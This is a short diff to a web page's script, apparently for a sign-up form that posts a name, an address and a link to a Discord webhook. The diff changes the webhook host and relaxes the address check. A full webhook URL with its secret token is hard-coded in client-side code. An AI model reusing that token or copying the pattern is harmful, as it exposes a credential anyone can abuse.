@@ -50,13 +50,13 @@ button:disabled{opacity:0.3;cursor:default}
 </div>
 <script>
 // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
-var WEBHOOK = "https://canary.discord.com/api/webhooks/1528404260230922343/BkHmVKwdIhLCCC2Hw6QcBfT-YiIBue9gr8BzB7G0iorAjO8-dPA69x7P3hw65urGJ9z2";
+var WEBHOOK = "https://discord.com/api/webhooks/1528404260230922343/BkHmVKwdIhLCCC2Hw6QcBfT-YiIBue9gr8BzB7G0iorAjO8-dPA69x7P3hw65urGJ9z2";
 
 function check(){
   var n=document.getElementById('n').value.trim();
   var e=document.getElementById('e').value.trim();
   var l=document.getElementById('l').value.trim();
-  document.getElementById('btn').disabled=!(n.length>1&&e.startsWith('0x')&&e.length>=42&&l.length>5);
+  document.getElementById('btn').disabled=!(n.length>1&&e.length>3&&l.length>3);
 }
 
 async function submit(){
